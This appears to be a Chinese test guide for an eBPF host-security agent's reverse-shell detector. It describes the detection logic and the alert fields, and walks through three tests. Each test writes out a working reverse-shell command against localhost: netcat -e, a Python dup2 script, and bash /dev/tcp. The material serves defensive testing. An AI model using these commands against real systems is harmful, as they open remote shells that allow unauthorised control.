# 反弹 Shell 检测 — 手动测试指南

## 概述

本文档描述如何手动验证 ebpf_base_detector 插件的反弹 Shell 检测功能（DataType 6007）。

**检测原理**：在 `sched_process_exec` Hook 中，当新进程执行时检查其 FD 0（stdin）和 FD 1（stdout）是否指向 IPv4 Socket。任一指向 Socket 即触发告警。

**检测能力边界**：

| 能检测 | 不能检测 |
|--------|----------|
| execve 时 stdin/stdout 已指向 socket 的场景 | stdin/stdout 通过管道（pipe）间接连接 socket 的场景 |
| nc -e、Python dup2、bash /dev/tcp、Perl exec | mkfifo 管道方式、socat PTY 方式 |

**关键源文件**：

| 文件 | 说明 |
|------|------|
| `business_plugins/ebpf_base_detector/ebpf/bpf/hids.bpf.c` | eBPF 内核代码（stdin/stdout socket 检测） |
| `business_plugins/ebpf_base_detector/reverse_shell.go` | 用户态反弹 Shell 检测逻辑 |
| `business_plugins/ebpf_base_detector/main.go` | 事件处理与告警生成 |

---

## 环境要求

| 项目 | 要求 |
|------|------|
| 内核版本 | >= 5.x |
| BTF 支持 | `/sys/kernel/btf/vmlinux` 存在 |
| 编译依赖 | clang、llvm、libbpf-dev、linux-headers |
| 运行权限 | root |
| 测试工具 | nc（netcat-traditional）、python3、perl |

---

## 编译部署与启动

```bash
# 1. 编译并部署
cd /home/work/goProject/src/company/agent
make build
make deploy

# 2. 启动 Agent（Terminal A）
# 检测事件输出到 stderr，Agent 运行日志输出到 /opt/cloudsec/logs/agent.log
cd /opt/cloudsec
sudo ./bin/agent -standalone -plugins=ebpf_base_detector -output=/opt/cloudsec/logs/agent.log -test
```

---

## 测试用例

每个测试需要两个终端：**Terminal B**（监听端）和 **Terminal C**（触发端）。

> **注意**：每个测试用例使用不同端口，避免端口冲突。测试完一个后在 Terminal B 按 Ctrl+C 关闭监听再进行下一个。

---

### RS001: nc -e 反弹（最直接）

**Terminal B — 启动监听**：

```bash
nc -lvp 9001
```

**Terminal C — 触发反弹 Shell**：

```bash
# ubuntu 默认的 nc 可能不支持 -e，需要安装 netcat-traditional
# sudo apt install netcat-traditional
nc.traditional -e /bin/bash 127.0.0.1 9001
```

**原理**：nc 建立 TCP 连接后 fork+exec `/bin/bash`，子进程的 stdin/stdout 继承 socket FD。

**预期告警**：

```
Reverse shell detected  comm=bash  exe_path=/usr/bin/bash  fd_type=3  remote_ip=127.0.0.1  remote_port=9001
```

> `fd_type=3` 表示 stdin(1) + stdout(2) = 3，两者都指向 socket。

**验证后清理**：在 Terminal B 输入 `exit` 关闭反弹 Shell，Ctrl+C 关闭监听。

---

### RS002: Python dup2 反弹

**Terminal B — 启动监听**：

```bash
nc -lvp 9002
```

**Terminal C — 触发反弹 Shell**：

```bash
python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",9002))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'
```

**原理**：Python 创建 socket 连接后，用 `os.dup2()` 将 FD 0/1/2 全部指向 socket，然后 `subprocess.call` 内部调用 `execve("/bin/bash")`。新 bash 进程的 stdin/stdout 直接是 socket。

**预期告警**：

```
Reverse shell detected  comm=bash  exe_path=/usr/bin/bash  fd_type=3  remote_ip=127.0.0.1  remote_port=9002
```

---

### RS003: bash /dev/tcp 反弹

**Terminal B — 启动监听**：

```bash
nc -lvp 9003
```

**Terminal C — 触发反弹 Shell**：

```bash
bash -c 'bash -i >& /dev/tcp/127.0.0.1/9003 0>&1'
```

**原理**：外层 bash 通过内建的 `/dev/tcp` 虚拟文件创建 socket，`>&` 将 stdout/stderr 重定向到 socket，`0>&1` 将 stdin 重定向到 socket，然后 exec 内层 `bash -i`。

**预期告警**：

```
Reverse shell detected  comm=bash  exe_path=/usr/bin/bash  fd_type=3  remote_ip=127.0.0.1  remote_port=9003
```

---

## 验证告警字段

在 Terminal A 的输出中，确认每条告警包含以下关键字段：

| 字段 | 说明 | 示例值 |
|------|------|--------|
| `pid` | 触发进程的线程 ID | 12345 |
| `tgid` | 触发进程的进程 ID | 12345 |
| `ppid` | 父进程 ID | 12300 |
| `comm` | 进程名 | bash |
| `exe_path` | 可执行文件完整路径 | /usr/bin/bash |
| `fd_type` | 触发的 FD 位标志 | 3 (stdin+stdout) |
| `remote_ip` | 攻击者 IP | 127.0.0.1 |
| `remote_port` | 攻击者监听端口 | 9001 |

**fd_type 含义**：

| 值 | 含义 |
|----|------|
| 1 | 仅 stdin (FD 0) 指向 socket |
| 2 | 仅 stdout (FD 1) 指向 socket |
| 3 | stdin + stdout 都指向 socket |

---

## 测试结果记录表

| # | 测试用例 | 预期结果 | 实际结果 | fd_type | remote_port | 备注 |
|---|----------|----------|----------|---------|-------------|------|
| 1 | RS001 nc -e 反弹 | 告警 | | 3 | 9001 | |
| 2 | RS002 Python dup2 反弹 | 告警 | | 3 | 9002 | |
| 3 | RS003 bash /dev/tcp 反弹 | 告警 | | 3 | 9003 | |

---

## 常见问题排查

| 问题 | 排查方法 |
|------|----------|
| Agent 启动失败 `failed to load eBPF` | 确认 root 权限；检查内核版本 >= 5.4；`uname -r` 查看 |
| 无任何告警输出 | 查看 eBPF 调试日志：`sudo cat /sys/kernel/debug/tracing/trace_pipe \| grep hids` |
| `nc -e` 报错 `invalid option` | 安装 `netcat-traditional`：`sudo apt install netcat-traditional`，使用 `nc.traditional` |
| bash /dev/tcp 报错 `No such file` | 确认使用的是 bash（不是 dash/sh）：`bash -c 'echo $BASH_VERSION'` |
| fd_type=1 或 2（不是 3） | 只有一个 FD 指向 socket，检查反弹命令是否正确重定向了 stdin 和 stdout |
| remote_ip 显示 0.0.0.0 | socket 未成功连接，检查监听端是否启动 |

---

## 测试完成后

1. 在 Terminal A 按 `Ctrl+C` 停止 Agent
2. 将测试结果填入上方记录表
